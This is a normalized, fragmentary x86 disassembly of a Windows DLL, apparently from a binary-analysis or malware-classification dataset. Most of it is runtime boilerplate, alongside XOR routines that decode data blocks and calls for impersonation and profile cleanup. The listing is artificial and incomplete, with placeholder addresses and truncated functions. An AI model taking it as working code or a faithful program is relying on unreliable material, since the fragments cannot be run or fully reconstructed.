jns r-xdata
inc edi
mov [ rw-data ] edi
jmp r-xdata
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov ecx esi
mov edx edi
add eax 0x8
dec ebx
jne r-xdata
mov edi [ rw-data ]
sub_10001000
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x20 ] ecx
mov [ eax + 0x24 ] ecx
retn
sub_1000118e
mov eax [ eax + 0xc ]
retn
sub_10001192
mov eax [ eax + 0x10 ]
retn
sub_10001196
mov eax [ eax + 0x14 ]
retn
sub_1000119a
mov eax [ eax + 0x18 ]
retn
sub_10001204
mov [ ecx ] r--data
jmp sub_10005655
sub_100019ed
mov eax [ eax + 0x110c ]
retn
sub_100019f4
mov eax [ eax + 0xc28 ]
retn
sub_10002251
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10005687
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10002489
push 0xc
push r--data
call sub_10013290
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
call sub_100024b8
jmp sub_100024aa
sub_100024a3
xor eax eax
inc eax
retn
sub_100024aa
or [ ebp - 0x4 ] 0xffffffff
mov al 0x1
call sub_100132cb
retn 0x4
sub_10003715
push esi
xor esi esi
call sub_100034c7
test eax eax
je r-xdata
test esi esi
setne al
pop esi
retn
call sub_10002d8e
movzx esi al
DebugCreate
call sub_10003901
xor eax eax
inc eax
retn
sub_100039a4
xor eax eax
xor [ eax + rw-data ] 0xd2
inc eax
cmp eax 0x3ce
jl r-xdata
retn
sub_10003b47
test esi esi
je r-xdata
retn
cmp [ esi ] 0x0
je r-xdata
call [ RevertToSelf@IAT ]
push [ esi + 0x4 ]
push [ esi ]
call [ UnloadUserProfile@IAT ]
push [ esi ]
call [ CloseHandle@IAT ]
sub_10003fd3
mov eax [ esi ]
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
retn
push eax
call sub_1000517a
pop ecx
sub_10003fe5
cmp [ eax + 0x8 ] 0x0
je r-xdata
retn
xor edx edx
cmp [ eax + 0x4 ] edx
jbe r-xdata
mov [ eax + 0x8 ] 0x0
mov ecx [ eax ]
xor [ ecx + edx ] 0x90
inc edx
cmp edx [ eax + 0x4 ]
jb r-xdata
sub_10004003
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
call [ GetTickCount@IAT ]
mov [ rw-data ] 0x1
jmp r-xdata
imul eax eax 0x343fd
add eax 0x269ec3
mov [ rw-data ] eax
shr eax 0x10
and eax 0x7fff
retn
sub_100050f2
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10005190
sub_1000517a
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10005185
sub_10005185
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_100079a5
sub_10005571
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_1000558e
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_100055db
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_100079a5
pop ecx
sub_10005655
mov [ ecx ] r--data
jmp sub_100055db
sub_10005980
xor eax eax
mov al [ esp + 0x8 ]
sub_10005a3e
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_10009147
add esp 0xc
pop ebp
retn
sub_10005a54
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10005a3e
sub_10005b2c
push [ ebp + 0x8 ]
call sub_100092bc
pop ecx
retn
sub_10005b36
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10005a7a
add esp 0xc
pop ebp
retn
sub_10005bd8
mov edi edi
push ebp
mov ebp esp
call sub_1000895f
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_10005bea
call sub_1000895f
mov ecx eax
mov eax [ ecx + 0x14 ]
imul eax eax 0x343fd
add eax 0x269ec3
mov [ ecx + 0x14 ] eax
shr eax 0x10
and eax 0x7fff
retn
sub_10005c49
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_1000a3ce
pop ecx
retn
sub_10005db6
push esi
call sub_100092bc
pop ecx
retn
sub_10006367
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100062bb
add esp 0x14
pop ebp
retn
sub_10006711
cmp [ ebp + 0x10 ] edi
jne r-xdata
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_100087f5
sub_1000686f
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
push eax
push ecx
call sub_1000b675
pop ecx
pop ecx
retn
sub_100076b6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10007995
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_10007afc
call sub_1000abd3
retn
sub_10007b02
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10007ac6
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_10007bad
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10008050
push 0xd
call sub_1000bebf
pop ecx
retn
sub_1000841f
push 0xd
call sub_1000bebf
pop ecx
retn
sub_10008458
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_100082be
pop ecx
mov [ rw-data ] 0x1
sub_100087a3
push 0xc
call sub_1000bebf
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_100087b8
call [ TlsAlloc@IAT ]
retn 0x4
sub_100088d4
push 0xd
call sub_1000bebf
pop ecx
retn
sub_100088dd
push 0xc
call sub_1000bebf
pop ecx
retn
sub_1000895f
mov edi edi
push esi
call sub_100088e6
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push 0x10
call sub_1000ae2f
sub_10008a93
push 0xd
call sub_1000bebf
pop ecx
retn
sub_10008a9f
push 0xc
call sub_1000bebf
pop ecx
retn
sub_10008ef0
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_1000c6e0
sub_10008f06
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_1000c6e0
sub_10009229
call sub_1000a3c5
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_100079a5
pop ecx
retn
call sub_1000c894
sub_100096e8
push 0x1
call sub_1000bebf
pop ecx
retn
sub_10009745
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_100099c6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_100098f0
add esp 0xc
pop ebp
retn 0x4
sub_100099f9
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_1000d735
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_10009a2b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_100098f0
add esp 0xc
pop ebp
retn 0x8
sub_1000a20d
push ebx
call sub_1000dad8
pop ecx
retn
sub_1000a38d
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_100092f8
pop ecx
pop ecx
retn
sub_1000a3bc
push 0x1
call sub_1000bebf
pop ecx
retn
sub_1000a3c5
push 0x1
call sub_1000a2eb
pop ecx
retn
sub_1000a435
push 0xe
call sub_1000bebf
pop ecx
retn
sub_1000a596
push ebx
call sub_1000dad8
pop ecx
retn
sub_1000a953
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_1000abb2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1000ab87
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_1000abca
push 0x8
call sub_1000bf98
pop ecx
retn
sub_1000abd3
push 0x8
call sub_1000bebf
pop ecx
retn
sub_1000adf5
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_1000bebf
pop ecx
sub_1000ae0a
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_1000acca
add esp 0xc
pop ebp
retn
sub_1000ae20
push 0x1
push 0x0
push 0x0
call sub_1000acca
add esp 0xc
retn
sub_1000ae2f
mov edi edi
push ebp
mov ebp esp
call sub_1000bde5
push [ ebp + 0x8 ]
call sub_1000bc36
pop ecx
push 0xff
call sub_1000ae0a
int3
sub_1000b4f9
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_1000b517
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
retn
sub_1000b895
push [ ebp + 0x8 ]
call sub_1000dad8
pop ecx
retn
sub_1000b961
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_1000bacc
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000b977
add esp 0x14
pop ebp
retn
sub_1000bb21
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_1000bae9
pop ecx
pop ecx
pop ebp
retn
sub_1000bebf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1000bf8f
push 0xa
call sub_1000bebf
pop ecx
retn
sub_1000c927
push 0x1
call sub_1000bebf
pop ecx
retn
sub_1000d34e
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000d14a
add esp 0x10
pop ebp
retn
sub_1000d4b4
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000d368
add esp 0x10
pop ebp
retn
sub_1000d5eb
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_1000d709
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_1000d640
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_1000d754
call eax
retn
sub_1000d8af
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000d799
add esp 0x10
pop ebp
retn
sub_1000dacf
push 0xa
call sub_1000bebf
pop ecx
retn
sub_1000dbd1
push 0xa
call sub_1000bebf
pop ecx
retn
sub_1000dc8f
push 0xb
call sub_1000bebf
pop ecx
retn
sub_1000dd69
push ebx
call sub_1000dad8
pop ecx
retn
sub_1000dd71
xor eax eax
retn
sub_1000dd74
mov eax sub_1001058e
mov [ rw-data ] eax
mov [ rw-data ] sub_1000fc84
mov [ rw-data ] sub_1000fc38
mov [ rw-data ] sub_1000fc71
mov [ rw-data ] sub_1000fbda
mov [ rw-data ] eax
mov [ rw-data ] sub_10010506
mov [ rw-data ] sub_1000fbf6
mov [ rw-data ] sub_1000fb58
mov [ rw-data ] sub_1000fae4
retn
sub_1000ddd4
mov edi edi
push ebp
mov ebp esp
call sub_1000dd74
cmp [ ebp + 0x8 ] 0x0
je r-xdata
fnclex
pop ebp
retn
call sub_100105b1
sub_1000e4cd
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fld [ ebp + 0x8 ]
frndint
fstp [ ebp - 0x8 ]
fld [ ebp - 0x8 ]
leave
retn
sub_1000e637
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstsw [ ebp - 0x4 ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_1000e647
mov edi edi
push ebp
mov ebp esp
push ecx
fnstsw [ ebp - 0x4 ]
fnclex
movsx eax [ ebp - 0x4 ]
leave
retn
sub_1000e708
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_1000e87c
push 0x8
push r--data
call sub_10009700
call sub_1000895f
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_100105d9
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_1000e89c
xor eax eax
inc eax
retn
sub_1000e8a0
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100105d9
sub_1000e8b5
push sub_1000e87c
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_1000e8c6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_1000e91b
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_1000ea8f
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_1000bebf
pop ecx
sub_1000eacb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1000eada
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1000eb3c
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_1000eae9
add esp 0x10
pop ebp
retn
sub_1000eb54
push 0x2
call sub_1000ae2f
sub_1000faae
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_1000facd
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_1000fc38
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000fbf6
add esp 0x10
pop ebp
retn
sub_1000fc71
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_1000fae4
pop ecx
pop ecx
pop ebp
retn
sub_1000fc84
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_1000fb58
pop ecx
pop ecx
pop ebp
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_10012e88
push [ ebp + 0x8 ]
call sub_100092bc
pop ecx
retn
sub_100132cb
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
leave
push ecx
retn
sub_100133e6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_1000d685
add esp 0x8
pop ebp
retn 0x4
sub_100136da
mov ecx [ ebp - 0x14 ]
mov edx [ ecx ]
xor ecx ecx
cmp [ edx ] 0xc0000005
sete cl
mov eax ecx
retn
sub_10013846
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_10005655
